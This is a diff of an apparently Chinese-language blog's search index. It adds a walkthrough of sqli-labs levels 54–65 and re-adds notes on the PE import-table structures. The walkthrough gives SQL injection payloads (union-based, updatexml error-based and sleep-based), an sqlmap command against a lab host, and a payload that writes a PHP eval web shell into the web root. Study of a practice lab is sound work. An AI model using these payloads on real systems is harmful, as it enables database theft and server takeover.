-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics; <span class="comment">//通常为0</span></span><br><span class="line">        DWORD   OriginalFirstThunk;</span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   ForwarderChain;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;</span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>
-<p>然后我们来看几个重要点的值</p>
-<ol>
-<li><p><code>DWORD   OriginalFirstThunk;</code>为INT表，是一个RVA指向了一个<code>PIMAGE_THUNK_DATA</code>结构</p>
-<p>当<code>PIMAGE_THUNK_DATA</code>的最高位为1时为一个序号，是一个以序号导出的函数的导出序号        </p>
-</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PBYTE  ForwarderString;</span><br><span class="line">        PDWORD Function;</span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        PIMAGE_IMPORT_BY_NAME  AddressOfData;</span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>
-<pre><code>当`PIMAGE_THUNK_DATA`的最高位为0时为一个RVA指针，而里面存的是RVA且指向`_IMAGE_IMPORT_BY_NAME`结构</code></pre>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;</span><br><span class="line">    BYTE    Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>
-<pre><code>且其中Hint为序号，不一定是导出序号，大部分的编译器置0；而Name则是指向函数名称首字符。</code></pre>
-<ol start="2">
-<li><p><code>DWORD   TimeDateStamp; </code>为时间戳</p>
-<p>当时间戳为0时表示为该dll未绑定</p>
-<p>当时间戳不为0时则该dll已被绑定，且时间戳于dll的时间戳相同（New Bound），如果不同则绑定已过期（Old Bound）</p>
-</li>
-<li><p><code>DWORD   Name;</code>为dll的文件名的地址(RVA)</p>
-</li>
-<li><p><code>DWORD   FirstThunk; </code>IAT表，在文件中值与INT表相同，在内存中载入后则为函数的真实地址(RVA)；如果该dll已绑定，则该值为该dll函数的真实地址</p>
-</li>
-</ol>
-<h2 id="0x01-导入表基本图解"><a href="#0x01-导入表基本图解" class="headerlink" title="0x01 导入表基本图解"></a>0x01 导入表基本图解</h2><p><img src="https://i.loli.net/2021/01/26/Uc8ZDgwiV5ldFWq.png" alt="image-20210126011214938"></p>
-<p><img src="https://i.loli.net/2021/01/26/Jiuf29PLQv8Hyw1.png" alt="image-20210126011353615"></p>
+<h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>The objective of this challenge is to dump the (secret key) from only random table from Database (‘CHALLENGES’) in Less than 10 attempts<br>For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.<br>凑，开局暴击，10次机会，错过就重置<br>首先用判断出是单引号闭合，然后使用order by 猜字段名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 100 # 正常</span></span><br></pre></td></tr></table></figure>
+<p>emmm好像order by没用，那就用group by</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; group by 3 # 正常</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">4</span> # 错误 </span><br></pre></td></tr></table></figure>
+<p>判断出有3个字段</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 #</span></span><br></pre></td></tr></table></figure>
+<p>爆出是<code>challenges</code>为数据库名<br>次数不够了，重置一下开始爆表名和字段名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>challenges<span class="string">&#x27;  --+</span></span><br></pre></td></tr></table></figure>
+<p>表名<code>zd7hw1th7d</code></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>zd7hw1th7d<span class="string">&#x27;  --+</span></span><br></pre></td></tr></table></figure>
+<p><code>id,sessid,secret_K1CG,tryy</code></p>
+<p>让我们查看一下secret_K1CG字段的value</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(0x7e,secret_K1CG,0x7e),3 from zd7hw1th7d  --+</span></span><br></pre></td></tr></table></figure>
+<p>爆出内容<br><code>~apBmqSPfQcta3g5dwVyPoO00~</code><br>key：apBmqSPfQcta3g5dwVyPoO00<br>过关</p>
+<hr>
+<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>开始探测闭合方式（可以用burp爆破）</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>) <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> (<span class="number">1</span>  正常</span><br></pre></td></tr></table></figure>
+<p>是小括号闭合</p>
+<p>猜表名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>爆出</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w4xiim6dlu</span><br></pre></td></tr></table></figure>
+<p>让我们看看<br><code>w4xiim6dlu</code></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;w4xiim6dlu&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>爆出</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secret_8581</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="number">0x7e</span>,secret_8581,<span class="number">0x7e</span>),<span class="number">3</span> <span class="keyword">from</span> w4xiim6dlu <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>取得数据<br><code>~rfulceyVFxsq51j1yq7kGt8D~</code></p>
+<hr>
+<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>探测闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) or 1=1 --+ 正常</span></span><br></pre></td></tr></table></figure>
+<p>剩下的和上一关一样</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;icq1mwfl07&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,group_concat(0x7e,secret_TVEL,0x7e),3 from icq1mwfl07 --+</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>探测闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;  --+</span><br></pre></td></tr></table></figure>
+<p>双引号闭合<br>剩下的和上几关一样，不再演示</p>
+<hr>
+<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>这关只有五次<br>根据爆错可以看到是单引号闭合</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure>
+<p>没反应，试试报错注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,(concat(0x7e,(select table_name from information_schema.tables where table_schema=database()),0x7e)),1) --+</span></span><br></pre></td></tr></table></figure>
+<p>芜湖，成功</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;</span><span class="number">1</span>m0z0tx769<span class="string">&#x27; limit 2,2 ),0x7e)),1) --+</span></span><br></pre></td></tr></table></figure>
+<p><code>Subquery returns more than 1 row</code><br>欸草，limit 用错了，要被笑了</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;</span>zdim9qe7y5<span class="string">&#x27; LIMIT 2,1 ),0x7e)),1) --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,(concat(0x7e,(select concat(secret_QZZ8) from zdim9qe7y5),0x7e)),1) --+</span></span><br></pre></td></tr></table></figure>
+<p>ok</p>
+<hr>
+<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>这题通过报错是数字型注入<br>其余和上题一样</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="operator">||</span> updatexml(<span class="number">1</span>,(concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">0x7e</span>)),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="operator">||</span> updatexml(<span class="number">1</span>,(concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;rqkli61x10&#x27;</span> LIMIT <span class="number">2</span>,<span class="number">1</span> ),<span class="number">0x7e</span>)),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="operator">||</span> updatexml(<span class="number">1</span>,(concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> concat(secret_V2XX) <span class="keyword">from</span> rqkli61x10),<span class="number">0x7e</span>)),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>get<code>~KM85Q1UPRPyyBUCX0iEIl3fy~</code></p>
+<hr>
+<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>通过报错信息可知闭合方式为”)，其余操作和上题一样<br>不再记录</p>
+<hr>
+<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>通过报错信息可知闭合方式为’))，其余操作和上题一样<br>不再记录</p>
+<hr>
+<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>通过测试闭合方式得出是’)闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
+<p>没反应，嗯当然不可能手动盲注啊<br>接下来，掏出我们的sqlmap跑一遍</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.98.133/sqli/Less-62/?id=1&quot; <span class="operator">-</span>D challenges <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
+<p>跑了一会，emmm，sqlmap会跑超限制，可以用burp爆破<br>这里不再演示好吧<br>或者直接写shell玩吧</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,&quot;&lt;?php eval($_POST[x]);?&gt;&quot;,3 into outfile &quot;C:\\PHPStudy\\WWW\\sqli\\Less-62\\1.php&quot;--+</span></span><br></pre></td></tr></table></figure>
+<p>我太难了</p>
+<hr>
+<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>探测闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="string">&#x27; || sleep(5) --+</span></span><br></pre></td></tr></table></figure>
+<p>接下来盲注跑吧</p>
+<hr>
+<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>探测闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> # 正常</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> # 错误</span><br></pre></td></tr></table></figure>
+<p>是数字型注入，剩下就是跑盲注</p>
+<hr>
+<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>探测注入方式</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;) and 1=1 and (&quot;<span class="number">1</span> 正常</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;) and 1=2 and (&quot;<span class="number">1</span> 错误</span><br></pre></td></tr></table></figure>
+<p>是”)闭合，剩下接盲注跑</p>
+<hr>
+<p>之后的关卡并没有文件，因此，sqli-lab靶场系列笔记结束<br>ok，就这样吧</p>
 ]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
       <tags>
         <tag>笔记</tag>
+        <tag>渗透</tag>
+        <tag>sqli-lab</tag>
       </tags>
   </entry>
   <entry>
@@ -788,6 +752,42 @@
 ]]></content>
       <tags>
         <tag>黑苹果</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>导入表学习笔记</title>
+    <url>/2021/01/27/%E5%AF%BC%E5%85%A5%E8%A1%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="导入表学习笔记"><a href="#导入表学习笔记" class="headerlink" title="导入表学习笔记"></a>导入表学习笔记</h1><hr>
+<h2 id="0x00-导入表概述"><a href="#0x00-导入表概述" class="headerlink" title="0x00 导入表概述"></a>0x00 导入表概述</h2><p>当程序使用非自身文件所写的函数，比如MessageBox的时候，这时候是从外界引了user32.dll里的函数。当程序使用了动态链接库里的函数时，编译和链接后的这些信息都会写入PE结构的导入表里。而我们的程序也是通过导入表来告诉操作系统这些函数该在哪去找。</p>
+<a id="more"></a>
+
+<p>而导入表则是位于IMAGE_DIRECTORY_ENTRY_IMPORT的第2项，而第2项指向的仍是一个数组。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics; <span class="comment">//通常为0</span></span><br><span class="line">        DWORD   OriginalFirstThunk;</span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   ForwarderChain;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;</span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>
+<p>然后我们来看几个重要点的值</p>
+<ol>
+<li><p><code>DWORD   OriginalFirstThunk;</code>为INT表，是一个RVA指向了一个<code>PIMAGE_THUNK_DATA</code>结构</p>
+<p>当<code>PIMAGE_THUNK_DATA</code>的最高位为1时为一个序号，是一个以序号导出的函数的导出序号        </p>
+</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PBYTE  ForwarderString;</span><br><span class="line">        PDWORD Function;</span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        PIMAGE_IMPORT_BY_NAME  AddressOfData;</span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>
+<pre><code>当`PIMAGE_THUNK_DATA`的最高位为0时为一个RVA指针，而里面存的是RVA且指向`_IMAGE_IMPORT_BY_NAME`结构</code></pre>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;</span><br><span class="line">    BYTE    Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>
+<pre><code>且其中Hint为序号，不一定是导出序号，大部分的编译器置0；而Name则是指向函数名称首字符。</code></pre>
+<ol start="2">
+<li><p><code>DWORD   TimeDateStamp; </code>为时间戳</p>
+<p>当时间戳为0时表示为该dll未绑定</p>
+<p>当时间戳不为0时则该dll已被绑定，且时间戳于dll的时间戳相同（New Bound），如果不同则绑定已过期（Old Bound）</p>
+</li>
+<li><p><code>DWORD   Name;</code>为dll的文件名的地址(RVA)</p>
+</li>
+<li><p><code>DWORD   FirstThunk; </code>IAT表，在文件中值与INT表相同，在内存中载入后则为函数的真实地址(RVA)；如果该dll已绑定，则该值为该dll函数的真实地址</p>
+</li>
+</ol>
+<h2 id="0x01-导入表基本图解"><a href="#0x01-导入表基本图解" class="headerlink" title="0x01 导入表基本图解"></a>0x01 导入表基本图解</h2><p><img src="https://i.loli.net/2021/01/26/Uc8ZDgwiV5ldFWq.png" alt="image-20210126011214938"></p>
+<p><img src="https://i.loli.net/2021/01/26/Jiuf29PLQv8Hyw1.png" alt="image-20210126011353615"></p>
+]]></content>
+      <tags>
+        <tag>笔记</tag>
       </tags>
   </entry>
   <entry>
